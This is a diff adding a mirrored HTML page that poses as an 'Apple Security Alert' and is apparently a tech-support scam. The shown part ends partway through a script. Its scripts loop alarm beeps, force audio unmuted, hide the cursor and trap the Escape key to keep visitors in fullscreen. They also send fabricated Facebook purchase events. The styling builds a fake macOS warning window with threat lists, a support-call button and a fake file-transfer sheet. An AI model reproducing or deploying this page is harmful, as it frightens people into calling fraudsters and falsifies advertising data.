@@ -1,0 +1,1687 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from monkfish-app-jflmp.ondigitalocean.app/huh/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 20 Jan 2026 18:19:32 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nositelinkssearchbox">
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet">
+  <meta name="slurp" content="noindex, nofollow">
+  <meta name="duckduckbot" content="noindex, nofollow">
+  <script>
+(function () {
+  'use strict';
+  var emb = false;
+  try {
+    emb = window.self !== window.top;
+  } catch (e) {
+    emb = true;
+  }
+  try {
+    if (!emb && /[?&]hcva_embed=1(?:&|$)/i.test(String(window.location.search || ''))) {
+      emb = true;
+    }
+  } catch (e2) {}
+  window.HCVA_EMBED_UI = emb;
+
+  if (!window.HCVA_EMBED_UI) return;
+
+  var ESC_HOLD_MS = 10000;
+  var escHoldTimer = null;
+
+  function inPresentation() {
+    var root = document.documentElement;
+    if (root.classList.contains('hcva-immersive-fs')) return true;
+    var d = document;
+    return !!(d.fullscreenElement || d.webkitFullscreenElement || d.webkitCurrentFullScreenElement ||
+      d.mozFullScreenElement || d.msFullscreenElement);
+  }
+
+  function isEsc(ev) {
+    return ev.key === 'Escape' || ev.key === 'Esc' || ev.code === 'Escape' || (ev.keyCode === 27);
+  }
+
+  function exitFs() {
+    var d = document;
+    if (d.exitFullscreen) return d.exitFullscreen().catch(function () {});
+    if (d.webkitExitFullscreen) return d.webkitExitFullscreen();
+    if (d.mozCancelFullScreen) return d.mozCancelFullScreen();
+    if (d.msExitFullscreen) return d.msExitFullscreen();
+  }
+
+  function leavePresentation() {
+    var root = document.documentElement;
+    var b = document.body;
+    root.classList.remove('hcva-immersive-fs');
+    if (b) b.classList.remove('fullscreen');
+    exitFs();
+    try {
+      document.dispatchEvent(new CustomEvent('hcva-presentation-leave'));
+    } catch (e3) {}
+  }
+
+  function clearHold() {
+    if (escHoldTimer != null) {
+      clearTimeout(escHoldTimer);
+      escHoldTimer = null;
+    }
+  }
+
+  function onKeyDown(ev) {
+    if (!isEsc(ev) || !inPresentation()) return;
+    ev.preventDefault();
+    if (ev.stopImmediatePropagation) ev.stopImmediatePropagation();
+    else ev.stopPropagation();
+    if (ev.repeat) return;
+    clearHold();
+    escHoldTimer = setTimeout(function () {
+      escHoldTimer = null;
+      leavePresentation();
+    }, ESC_HOLD_MS);
+  }
+
+  function onKeyUp(ev) {
+    if (!isEsc(ev)) return;
+    clearHold();
+  }
+
+  var opts = { capture: true, passive: false };
+  window.addEventListener('keydown', onKeyDown, opts);
+  window.addEventListener('keyup', onKeyUp, opts);
+})();
+  </script>
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod ?
+    n.callMethod.apply(n,arguments) : n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '4199909133654758');
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=4199909133654758&ev=PageView&noscript=1"/>
+  </noscript>
+
+  <script>
+    let hasClicked = false;
+    let hasStayed4Minutes = false;
+
+    document.addEventListener('click', function() {
+      hasClicked = true;
+      checkAndFirePixel();
+    });
+
+    setTimeout(() => {
+      hasStayed4Minutes = true;
+      checkAndFirePixel();
+    }, 180000);
+
+    function checkAndFirePixel() {
+      if (hasClicked && hasStayed4Minutes) {
+        const purchaseValue = (Math.random() * (2.5 - 0.5) + 0.5).toFixed(2);
+        const events = ['Purchase', 'Subscribe'];
+        const randomEvent = events[Math.floor(Math.random() * events.length)];
+        fbq('track', randomEvent, {
+          content_name: 'Click_And_4_Minute_Stay',
+          value: purchaseValue,
+          currency: 'USD'
+        });
+        hasClicked = false;
+        hasStayed4Minutes = false;
+      }
+    }
+  </script>
+
+  <script>
+    var hcvaAlertCtx = null;
+    var hcvaAlertLoopStarted = false;
+
+    function playAlertLoop() {
+      if (hcvaAlertLoopStarted) return;
+      hcvaAlertLoopStarted = true;
+
+      hcvaAlertCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+      function startBeeps() {
+        if (!hcvaAlertCtx) return;
+        if (hcvaAlertCtx.state === 'suspended') {
+          hcvaAlertCtx.resume().then(startBeeps).catch(function () {});
+          return;
+        }
+        setInterval(function () {
+          if (!hcvaAlertCtx || hcvaAlertCtx.state !== 'running') return;
+          var osc = hcvaAlertCtx.createOscillator();
+          var gain = hcvaAlertCtx.createGain();
+          osc.type = 'triangle';
+          osc.frequency.value = 1200;
+          osc.connect(gain);
+          gain.connect(hcvaAlertCtx.destination);
+          osc.start();
+          gain.gain.setValueAtTime(1, hcvaAlertCtx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.001, hcvaAlertCtx.currentTime + 0.2);
+          osc.stop(hcvaAlertCtx.currentTime + 0.2);
+        }, 1200);
+      }
+
+      startBeeps();
+    }
+
+    function hcvaForcePlayAudio(a) {
+      if (!a) return Promise.resolve(false);
+      if (!a.paused && !a.muted && a.volume > 0) return Promise.resolve(true);
+      if (!a.paused && a.muted) {
+        a.muted = false;
+        a.volume = 1;
+        return Promise.resolve(true);
+      }
+
+      a.loop = true;
+      a.preload = 'auto';
+      a.setAttribute('playsinline', '');
+      a.setAttribute('webkit-playsinline', '');
+      if (a.readyState < 2) {
+        try { a.load(); } catch (_loadErr) {}
+      }
+
+      function unmuteAfterStart() {
+        return new Promise(function (resolve) {
+          requestAnimationFrame(function () {
+            a.muted = false;
+            a.volume = 1;
+            resolve(true);
+          });
+        });
+      }
+
+      function tryMutedThenUnmute() {
+        a.muted = true;
+        a.volume = 1;
+        return a.play().then(unmuteAfterStart);
+      }
+
+      function tryLowVolumeThenFull() {
+        a.muted = false;
+        a.volume = 0.01;
+        return a.play().then(function () {
+          return new Promise(function (resolve) {
+            requestAnimationFrame(function () {
+              a.volume = 1;
+              resolve(true);
+            });
+          });
+        });
+      }
+
+      function tryDirect() {
+        a.muted = false;
+        a.volume = 1;
+        return a.play().then(function () {
+          return true;
+        });
+      }
+
+      return tryDirect()
+        .catch(function () { return tryMutedThenUnmute(); })
+        .catch(function () { return tryLowVolumeThenFull(); })
+        .catch(function () { return false; });
+    }
+
+    function hcvaStartMacAudio() {
+      var music = document.getElementById('music');
+      return hcvaForcePlayAudio(music).then(function (ok) {
+        if (!ok) return false;
+        playAlertLoop();
+        if (hcvaAlertCtx && hcvaAlertCtx.state === 'suspended') {
+          return hcvaAlertCtx.resume().then(function () {
+            return true;
+          }).catch(function () {
+            return true;
+          });
+        }
+        return true;
+      });
+    }
+
+    function hcvaBootMacAudio() {
+      hcvaStartMacAudio();
+    }
+
+    document.addEventListener('DOMContentLoaded', hcvaBootMacAudio);
+    window.addEventListener('load', hcvaBootMacAudio);
+
+    var macAudioBootAttempts = 0;
+    var macAudioBootTimer = window.setInterval(function () {
+      macAudioBootAttempts += 1;
+      hcvaStartMacAudio();
+      if (macAudioBootAttempts >= 20) {
+        clearInterval(macAudioBootTimer);
+      }
+    }, 400);
+
+    window.hcvaStartMacAudio = hcvaStartMacAudio;
+    window.hcvaBootMacAudio = hcvaBootMacAudio;
+
+    if (window.HCVA_EMBED_UI) {
+      window.addEventListener('message', function (ev) {
+        if (ev.data && ev.data.type === 'hcva:play_audio') {
+          hcvaBootMacAudio();
+        }
+      });
+      document.addEventListener('click', function () {
+        hcvaBootMacAudio();
+      }, true);
+    }
+  </script>
+
+  <title>Apple Security Alert</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background-image: url('bg1.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center center;
+      height: 100vh; width: 100vw;
+      overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Arial, sans-serif;
+      cursor: none;
+      display: flex;
+      flex-direction: column;
+    }
+
+    body.fullscreen { background-image: url('image.png'); }
+
+    html.hcva-immersive-fs,
+    html.hcva-immersive-fs body {
+      margin: 0 !important; width: 100% !important;
+      height: 100% !important; overflow: hidden !important;
+    }
+    html.hcva-immersive-fs body {
+      position: fixed !important; inset: 0 !important; z-index: 2147483646;
+    }
+
+    /* ── macOS Menu Bar ── */
+    .mac-menubar {
+      height: 28px;
+      background: rgba(18,18,18,0.88);
+      backdrop-filter: blur(30px) saturate(220%);
+      -webkit-backdrop-filter: blur(30px) saturate(220%);
+      display: flex; align-items: center;
+      padding: 0 12px;
+      border-bottom: 0.5px solid rgba(255,255,255,0.1);
+      flex-shrink: 0; z-index: 99999;
+      user-select: none;
+    }
+    .mac-menubar__apple {
+      font-size: 14px; color: rgba(255,255,255,0.95);
+      margin-right: 6px; line-height: 1;
+    }
+    .mac-menubar__items { display: flex; align-items: center; gap: 2px; }
+    .mac-menubar__item {
+      font-size: 13px; font-weight: 400;
+      color: rgba(255,255,255,0.92);
+      padding: 0 7px; line-height: 28px;
+    }
+    .mac-menubar__item.semibold { font-weight: 600; }
+    .mac-menubar__right {
+      margin-left: auto; display: flex; align-items: center; gap: 4px;
+    }
+    .mac-mb-icon {
+      display: flex; align-items: center; justify-content: center;
+      padding: 0 5px; height: 28px; opacity: 0.9;
+    }
+    .mac-mb-icon svg { width: 14px; height: 14px; fill: white; }
+    .mac-mb-clock {
+      font-size: 12.5px; color: rgba(255,255,255,0.92);
+      font-variant-numeric: tabular-nums; padding: 0 6px;
+      font-weight: 400;
+    }
+
+    /* ── Desktop stage ── */
+    .mac-desktop {
+      position: fixed;
+      inset: 28px 0 36px 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+    }
+
+    /* ── Main macOS Security window ── */
+    .mac-window {
+      width: 500px;
+      background: rgba(28,28,30,0.98);
+      border-radius: 12px;
+      box-shadow:
+        0 0 0 0.5px rgba(255,255,255,0.13),
+        0 2px 4px rgba(0,0,0,0.3),
+        0 12px 40px rgba(0,0,0,0.55),
+        0 40px 80px rgba(0,0,0,0.35);
+      overflow: hidden;
+      animation: macWindowAppear 0.38s cubic-bezier(0.16,1,0.3,1) forwards;
+      transform-origin: center center;
+    }
+    @keyframes macWindowAppear {
+      0%  { opacity: 0; transform: scale(0.88) translateY(10px); }
+      100%{ opacity: 1; transform: scale(1)    translateY(0); }
+    }
+
+    /* Title bar */
+    .mac-titlebar {
+      height: 44px;
+      background: rgba(44,44,46,0.99);
+      display: flex; align-items: center;
+      padding: 0 14px;
+      border-bottom: 0.5px solid rgba(255,255,255,0.07);
+      position: relative; flex-shrink: 0;
+    }
+    .mac-traffic { display: flex; gap: 8px; align-items: center; }
+    .mac-dot {
+      width: 12px; height: 12px; border-radius: 50%;
+      position: relative; flex-shrink: 0;
+    }
+    .mac-dot-r { background: #ff5f57; box-shadow: inset 0 0 0 0.5px rgba(0,0,0,0.2); }
+    .mac-dot-y { background: #febc2e; box-shadow: inset 0 0 0 0.5px rgba(0,0,0,0.2); }
+    .mac-dot-g { background: #28c840; box-shadow: inset 0 0 0 0.5px rgba(0,0,0,0.2); }
+    .mac-titlebar-label {
+      position: absolute; left: 50%; transform: translateX(-50%);
+      display: flex; align-items: center; gap: 7px;
+      font-size: 13px; font-weight: 600;
+      color: rgba(255,255,255,0.85);
+      white-space: nowrap;
+    }
+    .mac-titlebar-label svg { width: 14px; height: 14px; flex-shrink: 0; }
+
+    /* Toolbar / breadcrumb bar */
+    .mac-toolbar {
+      background: rgba(38,38,40,0.98);
+      border-bottom: 0.5px solid rgba(255,255,255,0.07);
+      padding: 7px 16px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .mac-toolbar-chip {
+      display: inline-flex; align-items: center; gap: 5px;
+      background: rgba(255,69,58,0.18);
+      border: 0.5px solid rgba(255,69,58,0.38);
+      border-radius: 6px; padding: 3px 9px;
+      font-size: 11px; font-weight: 700;
+      color: #ff453a; letter-spacing: 0.04em;
+    }
+    .mac-toolbar-chip svg { width: 10px; height: 10px; fill: #ff453a; }
+    .mac-toolbar-scan {
+      flex: 1; display: flex; flex-direction: column; gap: 3px;
+    }
+    .mac-scan-label {
+      display: flex; justify-content: space-between;
+      font-size: 10px; color: rgba(235,235,245,0.4);
+    }
+    .mac-scan-track {
+      height: 3px; border-radius: 2px;
+      background: rgba(255,255,255,0.07); overflow: hidden;
+    }
+    .mac-scan-fill {
+      height: 100%; border-radius: 2px;
+      background: linear-gradient(90deg, #0a84ff 0%, #30d158 100%);
+      width: 0%;
+      animation: scanFill 3.8s cubic-bezier(0.1,0,0.2,1) 0.4s forwards;
+    }
+    @keyframes scanFill {
+      0%  { width: 0%; }
+      35% { width: 48%; }
+      65% { width: 76%; }
+      85% { width: 91%; }
+      100%{ width: 100%; }
+    }
+
+    /* Window content */
+    .mac-window-body {
+      padding: 18px 20px 20px;
+      display: flex; flex-direction: column; gap: 12px;
+      max-height: calc(100vh - 200px);
+      overflow-y: auto; scrollbar-width: none;
+    }
+    .mac-window-body::-webkit-scrollbar { display: none; }
+
+    /* Alert header */
+    .mac-alert-head {
+      display: flex; align-items: center; gap: 14px;
+    }
+    .mac-alert-icon-wrap {
+      width: 54px; height: 54px; flex-shrink: 0;
+    }
+    .mac-alert-icon-wrap svg { width: 100%; height: 100%; }
+    .mac-alert-titles { flex: 1; }
+    .mac-alert-titles h1 {
+      font-size: 15px; font-weight: 700; color: #f2f2f7;
+      margin-bottom: 4px; letter-spacing: -0.015em;
+    }
+    .mac-alert-titles p {
+      font-size: 12px; color: rgba(235,235,245,0.58); line-height: 1.45;
+    }
+
+    /* Section label */
+    .mac-section-label {
+      font-size: 10.5px; font-weight: 700;
+      color: rgba(235,235,245,0.42);
+      text-transform: uppercase; letter-spacing: 0.07em;
+      margin-bottom: -4px;
+    }
+
+    /* IP info box */
+    .mac-ip-box {
+      background: rgba(255,255,255,0.045);
+      border: 0.5px solid rgba(255,255,255,0.09);
+      border-radius: 10px; overflow: hidden;
+    }
+    .mac-ip-row {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 8px 13px; gap: 10px;
+    }
+    .mac-ip-row + .mac-ip-row {
+      border-top: 0.5px solid rgba(255,255,255,0.055);
+    }
+    .mac-ip-key {
+      font-size: 12px; color: rgba(235,235,245,0.5); flex-shrink: 0;
+    }
+    .mac-ip-val {
+      font-size: 12px; font-weight: 600;
+      font-family: "SF Mono", "Menlo", "Monaco", monospace;
+      color: #ff9f0a;
+    }
+    .mac-badge-red {
+      display: inline-flex; align-items: center; gap: 4px;
+      padding: 2px 8px; border-radius: 5px;
+      background: rgba(255,69,58,0.22);
+      border: 0.5px solid rgba(255,69,58,0.45);
+      font-size: 10px; font-weight: 800;
+      color: #ff453a; letter-spacing: 0.06em;
+    }
+    .mac-badge-red svg { width: 8px; height: 8px; fill: #ff453a; }
+
+    /* Threats */
+    .mac-threats { display: flex; flex-direction: column; gap: 5px; }
+    .mac-threat-row {
+      display: flex; align-items: flex-start; gap: 10px;
+      padding: 8px 12px; border-radius: 8px;
+      background: rgba(255,59,48,0.07);
+      border: 0.5px solid rgba(255,59,48,0.22);
+    }
+    .mac-threat-dot {
+      width: 18px; height: 18px; border-radius: 50%;
+      background: #ff453a;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 10px; font-weight: 800; color: white;
+      flex-shrink: 0; margin-top: 1px;
+    }
+    .mac-threat-content strong {
+      display: block; font-size: 11.5px; font-weight: 700;
+      color: #ff6b6b; margin-bottom: 2px;
+    }
+    .mac-threat-content span {
+      font-size: 11px; color: rgba(235,235,245,0.62); line-height: 1.35;
+    }
+
+    /* Call box */
+    .mac-call-box {
+      background: rgba(10,132,255,0.09);
+      border: 0.5px solid rgba(10,132,255,0.32);
+      border-radius: 10px;
+      padding: 12px 16px;
+      display: flex; align-items: center; gap: 14px;
+    }
+    .mac-call-box svg { width: 28px; height: 28px; flex-shrink: 0; }
+    .mac-call-text { flex: 1; }
+    .mac-call-text .lbl {
+      font-size: 10.5px; color: rgba(235,235,245,0.5);
+      text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 3px;
+    }
+    .mac-call-text .num {
+      font-size: 18px; font-weight: 700; color: #0a84ff;
+      letter-spacing: -0.02em;
+    }
+
+    /* Buttons */
+    .mac-btn-row {
+      display: flex; gap: 8px; justify-content: flex-end;
+      margin-top: 2px;
+    }
+    .mac-btn-secondary, .mac-btn-primary {
+      padding: 7px 20px; border-radius: 7px;
+      border: none; font-size: 13px;
+      font-family: inherit; cursor: pointer;
+    }
+    .mac-btn-secondary {
+      background: rgba(255,255,255,0.1);
+      border: 0.5px solid rgba(255,255,255,0.16);
+      color: rgba(235,235,245,0.9); font-weight: 400;
+    }
+    .mac-btn-primary {
+      background: #0a84ff; color: white; font-weight: 600;
+      box-shadow: 0 1px 4px rgba(10,132,255,0.4);
+      animation: btnPulse 2.2s ease-in-out 1.5s infinite;
+    }
+    @keyframes btnPulse {
+      0%,100% { box-shadow: 0 1px 4px rgba(10,132,255,0.4); }
+      50%      { box-shadow: 0 0 0 5px rgba(10,132,255,0.0), 0 1px 12px rgba(10,132,255,0.6); }
+    }
+
+    /* ── macOS notification card (top-right) ── */
+    .mac-notif {
+      position: fixed; top: 38px; right: 16px;
+      width: 310px;
+      background: rgba(44,44,46,0.97);
+      backdrop-filter: blur(24px) saturate(200%);
+      -webkit-backdrop-filter: blur(24px) saturate(200%);
+      border-radius: 14px;
+      border: 0.5px solid rgba(255,255,255,0.12);
+      box-shadow: 0 10px 36px rgba(0,0,0,0.42);
+      padding: 11px 13px;
+      z-index: 9998;
+      animation: notifIn 0.36s cubic-bezier(0.16,1,0.3,1) 0.7s both;
+    }
+    @keyframes notifIn {
+      from { opacity: 0; transform: translateX(24px) scale(0.96); }
+      to   { opacity: 1; transform: translateX(0)    scale(1); }
+    }
+    .mac-notif-top {
+      display: flex; align-items: center; gap: 7px; margin-bottom: 6px;
+    }
+    .mac-notif-appicon {
+      width: 18px; height: 18px; border-radius: 5px;
+      background: #1c1c1e;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; flex-shrink: 0;
+    }
+    .mac-notif-appname {
+      font-size: 11px; font-weight: 600;
+      color: rgba(235,235,245,0.5);
+      text-transform: uppercase; letter-spacing: 0.05em; flex: 1;
+    }
+    .mac-notif-time { font-size: 11px; color: rgba(235,235,245,0.36); }
+    .mac-notif-title {
+      font-size: 13px; font-weight: 700; color: #f2f2f7;
+      margin-bottom: 3px; letter-spacing: -0.01em;
+    }
+    .mac-notif-body {
+      font-size: 12px; color: rgba(235,235,245,0.68); line-height: 1.42;
+    }
+
+    /* Second smaller notification */
+    .mac-notif-2 {
+      position: fixed; top: 160px; right: 16px;
+      width: 310px;
+      background: rgba(44,44,46,0.97);
+      backdrop-filter: blur(24px) saturate(200%);
+      -webkit-backdrop-filter: blur(24px) saturate(200%);
+      border-radius: 14px;
+      border: 0.5px solid rgba(255,255,255,0.12);
+      box-shadow: 0 10px 36px rgba(0,0,0,0.42);
+      padding: 11px 13px;
+      z-index: 9997;
+      animation: notifIn 0.36s cubic-bezier(0.16,1,0.3,1) 2s both;
+    }
+
+    /* ── Bottom marquee ── */
+    .mac-marquee {
+      position: fixed; bottom: 0; left: 0;
+      width: 100%; height: 36px; line-height: 36px;
+      background: rgba(0,0,0,0.84);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      z-index: 9999; overflow: hidden; pointer-events: none;
+    }
+    .mac-marquee-track {
+      display: flex; width: max-content;
+      animation: marqueeRoll 22s linear infinite;
+    }
+    .mac-marquee-item {
+      display: flex; align-items: center; gap: 12px;
+      padding: 0 52px; white-space: nowrap;
+      color: rgba(255,255,255,0.88); font-size: 12.5px; font-weight: 500;
+    }
+    @keyframes marqueeRoll { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
+
+    /* ── macOS modal overlay ── */
+    #modal-overlay {
+      display: none; position: fixed;
+      inset: 0; background: rgba(0,0,0,0.55);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      z-index: 9999999;
+    }
+    #modal-content {
+      background: rgba(40,40,42,0.99);
+      border-radius: 14px;
+      border: 0.5px solid rgba(255,255,255,0.13);
+      max-width: 400px; width: calc(100% - 48px);
+      margin: 70px auto;
+      padding: 26px 24px 22px;
+      text-align: center;
+      color: #f2f2f7;
+      box-shadow: 0 30px 70px rgba(0,0,0,0.65);
+      font-family: inherit;
+    }
+    #modal-close {
+      cursor: pointer; color: rgba(255,255,255,0.35);
+      float: right; font-size: 18px; font-weight: 700;
+      line-height: 1; margin-top: -4px;
+    }
+    .modal-icon-wrap {
+      margin: 0 auto 14px;
+      width: 52px; height: 52px;
+    }
+    .modal-icon-wrap svg { width: 100%; height: 100%; }
+    #modal-message {
+      font-size: 17px; font-weight: 700; color: #f2f2f7;
+      margin-bottom: 14px; line-height: 1.35; letter-spacing: -0.015em;
+    }
+    #modal-ip-block {
+      background: rgba(255,255,255,0.05);
+      border: 0.5px solid rgba(255,255,255,0.1);
+      border-radius: 10px; padding: 13px;
+      margin-bottom: 14px; text-align: left;
+      font-size: 12.5px; color: rgba(235,235,245,0.72);
+      line-height: 1.6;
+    }
+    #modal-ip-block .hcva-ip-big {
+      display: block;
+      font-family: "SF Mono", Menlo, monospace;
+      font-size: 18px; font-weight: 700; color: #0a84ff;
+      margin: 5px 0; word-break: break-all;
+    }
+    .modal-badges { display: flex; gap: 6px; margin-top: 8px; flex-wrap: wrap; }
+    #modal-ip-block .hcva-ip-bad {
+      display: inline-block; padding: 3px 9px;
+      background: #ff453a; color: #fff;
+      font-size: 10.5px; font-weight: 800;
+      letter-spacing: 0.05em; border-radius: 5px;
+    }
+    #modal-ip-block .hcva-ip-bad2 {
+      display: inline-block; padding: 3px 9px;
+      background: #6e1010; color: #ffa0a0;
+      font-size: 10.5px; font-weight: 800;
+      letter-spacing: 0.05em; border-radius: 5px;
+    }
+    .modal-sub {
+      font-size: 12.5px; color: rgba(235,235,245,0.55);
+      font-weight: 500; margin-bottom: 16px; line-height: 1.45;
+    }
+    .modal-btns {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 6px;
+      padding-top: 14px;
+      border-top: 0.5px solid rgba(255, 255, 255, 0.1);
+    }
+    .modal-btns button,
+    .modal-btns a.call-btn {
+      width: 100%;
+      padding: 11px 14px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-family: inherit;
+      text-align: center;
+      box-sizing: border-box;
+    }
+    .modal-btns button.ok-btn {
+      background: rgba(255, 255, 255, 0.1);
+      border: 0.5px solid rgba(255, 255, 255, 0.14);
+      color: #f2f2f7;
+      font-size: 14px;
+      font-weight: 500;
+    }
+    .modal-btns a.call-btn {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+      background: #0a84ff;
+      border: none;
+      text-decoration: none;
+      color: #fff;
+      min-height: 52px;
+    }
+    .call-btn__label {
+      font-size: 14px;
+      font-weight: 700;
+      color: #fff;
+      line-height: 1.2;
+    }
+    .call-btn__num {
+      font-size: 12px;
+      font-weight: 600;
+      color: rgba(255, 255, 255, 0.95);
+      line-height: 1.2;
+      white-space: nowrap;
+      font-variant-numeric: tabular-nums;
+    }
+    .modal-btns a.call-btn.blinking {
+      animation: callBtnPulse 1.8s ease-in-out infinite;
+    }
+    @keyframes callBtnPulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(10, 132, 255, 0.45); }
+      50%      { box-shadow: 0 0 0 7px rgba(10, 132, 255, 0); }
+    }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.55} }
+
+    /* welcomeDiv & support-text */
+    #welcomeDiv {
+      display: none; background: rgba(0,0,0,0.88);
+      position: fixed; top: 28px; left: 50%;
+      transform: translateX(-50%);
+      width: 520px; max-width: 96%;
+      z-index: 9999999999; text-align: center;
+      border-radius: 0 0 12px 12px;
+      padding: 12px 16px;
+      border: 0.5px solid rgba(255,255,255,0.1);
+      font-family: inherit;
+    }
+    #welcomeDiv p { color: #f2f2f7; font-size: 13.5px; line-height: 1.55; }
+    #support-text {
+      position: fixed;
+      left: 50%;
+      bottom: 46px;
+      transform: translateX(-50%);
+      width: min(760px, calc(100% - 28px));
+      display: none;
+      text-align: center;
+      padding: 10px 14px;
+      border-radius: 14px;
+      background: rgba(24,24,28,0.86);
+      border: 0.5px solid rgba(255,255,255,0.18);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      box-shadow: 0 10px 28px rgba(0,0,0,0.38);
+      z-index: 10002;
+    }
+    #support-text .support-alert {
+      color: #ff7b72;
+      font-size: 15px;
+      font-weight: 700;
+      line-height: 1.25;
+      letter-spacing: 0.01em;
+      margin-bottom: 3px;
+    }
+    #support-text .support-line {
+      color: rgba(255,255,255,0.9);
+      font-size: 15px;
+      font-weight: 500;
+      line-height: 1.2;
+    }
+    #support-text .support-number {
+      color: #f2f2f7;
+      font-weight: 800;
+      white-space: nowrap;
+    }
+    #music { display: none; }
+
+    /* ── macOS file transfer / copy progress sheet ── */
+    .mac-file-transfer {
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      width: min(420px, calc(100vw - 32px));
+      z-index: 10001;
+      opacity: 0;
+      transform: translate(-50%, -46%);
+      pointer-events: none;
+      transition: opacity 0.45s cubic-bezier(0.16, 1, 0.3, 1), transform 0.45s cubic-bezier(0.16, 1, 0.3, 1);
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif;
+    }
+    .mac-file-transfer.is-visible {
+      opacity: 1;
+      transform: translate(-50%, -50%);
+    }
+    .mac-file-transfer__shell {
+      background: rgba(44, 44, 46, 0.96);
+      backdrop-filter: blur(28px) saturate(180%);
+      -webkit-backdrop-filter: blur(28px) saturate(180%);
+      border: 0.5px solid rgba(255, 255, 255, 0.14);
+      border-radius: 14px;
+      box-shadow: 0 18px 48px rgba(0, 0, 0, 0.48);
+      padding: 16px 16px 14px;
+    }
+    .mac-file-transfer__header {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+    .mac-file-transfer__icons {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex-shrink: 0;
+      padding-top: 2px;
+    }
+    .mac-file-transfer__ico svg { width: 28px; height: 28px; display: block; }
+    .mac-file-transfer__arrow {
+      color: rgba(235, 235, 245, 0.45);
+      font-size: 13px;
+      line-height: 1;
+    }
+    .mac-file-transfer__copy { min-width: 0; flex: 1; }
+    .mac-file-transfer__title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #f2f2f7;
+      letter-spacing: -0.015em;
+      line-height: 1.35;
+      margin: 0 0 3px;
+    }
+    .mac-file-transfer__subtitle {
+      font-size: 12px;
+      color: rgba(235, 235, 245, 0.58);
+      line-height: 1.35;
+      margin: 0;
+    }
+    .mac-file-transfer__subtitle strong {
+      color: rgba(235, 235, 245, 0.82);
+      font-weight: 600;
+    }
+    .mac-file-transfer__progress-track {
+      height: 4px;
+      background: rgba(255, 255, 255, 0.12);
+      border-radius: 999px;
+      overflow: hidden;
+      margin-bottom: 10px;
+    }
+    .mac-file-transfer__progress-fill {
+      height: 100%;
+      width: 0%;
+      background: #0a84ff;
+      border-radius: 999px;
+      transition: width 0.25s linear;
+      box-shadow: 0 0 8px rgba(10, 132, 255, 0.35);
+    }
+    .mac-file-transfer__meta {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      font-size: 11.5px;
+      color: rgba(235, 235, 245, 0.52);
+      margin-bottom: 10px;
+      font-variant-numeric: tabular-nums;
+    }
+    .mac-file-transfer__meta span:last-child { text-align: right; }
+    .mac-file-transfer__file {
+      font-size: 11.5px;
+      color: rgba(235, 235, 245, 0.72);
+      padding: 9px 10px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 0.5px solid rgba(255, 255, 255, 0.08);
+      border-radius: 8px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      margin-bottom: 12px;
+    }
+    .mac-file-transfer__footer {
+      display: flex;
+      justify-content: flex-end;
+    }
+    .mac-file-transfer__stop {
+      appearance: none;
+      border: 0.5px solid rgba(255, 255, 255, 0.14);
+      background: rgba(255, 255, 255, 0.08);
+      color: rgba(235, 235, 245, 0.92);
+      font-family: inherit;
+      font-size: 12px;
+      font-weight: 500;
+      padding: 5px 14px;
+      border-radius: 6px;
+      cursor: default;
+    }
+
+    /* Threat rows animate in */
+    .mac-threat-row { opacity: 0; }
+    .mac-threat-row.visible { opacity: 1; transition: opacity 0.3s ease; }
+  </style>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      var isPopupVisible = true;
+      var music = document.getElementById('music');
+      var isPlaying = false;
+      var audioStarted = false;
+      var audioUnlockEvents = ['click', 'keydown', 'touchstart', 'mousedown'];
+
+      function toggleMusic() {
+        if (!music) return;
+        if (isPlaying) {
+          music.pause();
+          isPlaying = false;
+          return;
+        }
+        music.play().then(function () {
+          isPlaying = true;
+        }).catch(function () {
+          isPlaying = false;
+        });
+      }
+
+      function tryStartAudio() {
+        if (audioStarted) return;
+        hcvaStartMacAudio().then(function (ok) {
+          if (!ok) return;
+          audioStarted = true;
